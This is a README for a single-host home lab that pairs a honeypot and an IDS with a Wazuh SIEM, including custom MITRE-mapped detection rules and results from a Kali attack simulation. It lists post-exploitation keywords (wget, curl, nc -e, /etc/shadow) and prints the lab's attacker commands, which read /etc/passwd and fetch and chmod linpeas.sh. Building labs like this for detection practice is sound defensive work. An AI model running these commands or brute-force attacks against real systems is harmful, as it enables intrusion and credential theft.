# docker-mini-soc: Single-Host Mini-SOC Lab (Wazuh, Cowrie, and Suricata)

## Why I built this
Running a full enterprise SIEM stack on a laptop usually eats 12+ GB of RAM, leaving no memory to run a Kali Linux attacker VM alongside it. I wanted a single-host SOC lab that stays under 2.5 GB of RAM while still giving me real network IDS telemetry, real SSH honeypot session logs, custom Wazuh detection rules mapped to MITRE ATT&CK, and an automated way to replay attacks from Kali.

In this lab, I wired together four containers on a dedicated Docker bridge network (`172.28.0.0/24`):
1. **Cowrie SSH/Telnet Honeypot (`172.28.0.20`)**: Exposes port `2222`, logs every failed password guess, successful login, and interactive shell command as structured JSON (`logs/cowrie/cowrie.json`).
2. **Suricata IDS (`172.28.0.30`)**: Watches the bridge interface and writes network alerts (`ET SCAN`, `LibSSH BruteForce`, outbound `wget` policy alerts) to `logs/suricata/eve.json`.
3. **Wazuh Manager (`172.28.0.11`)**: Mounts both log directories read-only and evaluates events against my custom XML rule set ([rules/custom_wazuh_rules.xml](rules/custom_wazuh_rules.xml)).
4. **OpenSearch Single-Node Indexer (`172.28.0.10`)**: Capped at a 512 MB JVM heap (`-Xms512m -Xmx512m`) so the whole stack runs comfortably on an Intel MacBook Pro.

## Architecture diagram

```text
+-----------------------------------------------------------------------------------+
| Kali Linux Attacker VM (172.16.167.131)                                           |
|   attacks/simulate_from_kali.sh  --->  nmap (T1046) + hydra (T1110) + ssh (T1059) |
+-----------------------------------------+-----------------------------------------+
                                          |
                                          | TCP :2222 / :2223
                                          v
+-----------------------------------------------------------------------------------+
| Docker Bridge Network: soc_net (172.28.0.0/24)                                    |
|                                                                                   |
|  +------------------------------+       +--------------------------------------+  |
|  | Cowrie Honeypot (2.5.0)      |       | Suricata IDS (7.0.4)                 |  |
|  | IP: 172.28.0.20 (:2222)      |       | IP: 172.28.0.30 (af-packet eth0)     |  |
|  | Logs: logs/cowrie/cowrie.json|       | Logs: logs/suricata/eve.json         |  |
|  +--------------+---------------+       +-------------------+------------------+  |
|                 |                                           |                     |
|                 +---------------------+---------------------+                     |
|                                       | Shared Bind-Mount Volumes (:ro)           |
|                                       v                                           |
|  +-----------------------------------------------------------------------------+  |
|  | Wazuh Manager (4.7.3)  [IP: 172.28.0.11]                                    |  |
|  | Custom Rules: rules/custom_wazuh_rules.xml (Rules 100500 - 100505)          |  |
|  +------------------------------------+----------------------------------------+  |
|                                       |                                           |
|                                       v                                           |
|  +-----------------------------------------------------------------------------+  |
|  | OpenSearch Single-Node Indexer (2.11.1)  [IP: 172.28.0.10, Heap: 512MB]     |  |
|  +-----------------------------------------------------------------------------+  |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
                   scripts/parse_alerts.py -> reports/alert_summary.md
```

## Custom Wazuh detection rules I wrote
All six custom rules live in [rules/custom_wazuh_rules.xml](rules/custom_wazuh_rules.xml):

| Wazuh Rule ID | Level | Sensor Source | MITRE Tactic | MITRE Technique | What triggers the rule |
|---|---|---|---|---|---|
| `100500` | `3` | Cowrie JSON | Base Decoder | N/A | Parent rule grouping all JSON events where `eventid` starts with `cowrie.` |
| `100501` | `6` | Cowrie JSON | Credential Access | `T1110.001` | Single `cowrie.login.failed` event (logs username and source IP) |
| `100502` | `10` | Cowrie JSON | Credential Access | `T1110` | Stateful correlation: `5+` failed logins (`100501`) within `120s` from `same_source_ip` |
| `100503` | `12` | Cowrie JSON | Initial Access / Lateral Movement | `T1021.004` / `T1078` | `cowrie.login.success` on the honeypot (high-signal indicator since a honeypot has no legitimate users) |
| `100504` | `13` | Cowrie JSON | Execution | `T1059.004` | `cowrie.command.input` matching post-exploitation commands (`wget`, `curl`, `chmod +x`, `/etc/shadow`, `/etc/passwd`, `uname -a`, `id`, `nc -e`) |
| `100505` | `10` | Suricata `eve.json` | Discovery | `T1046` | Suricata `event_type=alert` firing on Nmap service discovery or rapid SSH connection bursts |

## Results from the Kali attack simulation
Running [attacks/simulate_from_kali.sh](attacks/simulate_from_kali.sh) from my Kali VM (`172.16.167.131`) against port `2222` and parsing the resulting telemetry with [scripts/parse_alerts.py](scripts/parse_alerts.py) produced 12 correlated alert events in [reports/alert_summary.md](reports/alert_summary.md):
- **6 SSH brute-force events (`100501 / 100502`, HIGH, `T1110.001`)** across `172.16.167.131` and `185.220.101.45`.
- **1 honeypot login compromise (`100503`, HIGH, `T1021.004`)** when `root` authenticated with `123456`.
- **2 post-exploitation shell alerts (`100504`, CRITICAL, `T1059.004`)** on `uname -a && id && cat /etc/passwd` and `wget http://172.16.167.131:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh`.
- **3 Suricata IDS network alerts (`100505`, HIGH, `T1046`)**: `ET SCAN Potential SSH Scan`, `ET SCAN LibSSH Based Frequent SSH Connections Likely BruteForce Attack`, and `ET POLICY GNU/Linux Wget User-Agent Outbound` (catching the honeypot reaching back to the Kali staging server on port `8000`).

![alerts](docs/screenshots/01_mini_soc_alerts.png)

## How to run it
```bash
# 1. Validate docker-compose.yml, syntax-check scripts, and generate reports/alert_summary.md
make test

# 2. Boot the stack
make up

# 3. Run the attack sequence from Kali
bash attacks/simulate_from_kali.sh 172.16.167.131 2222

# 4. Tear down containers and volumes
make clean
```
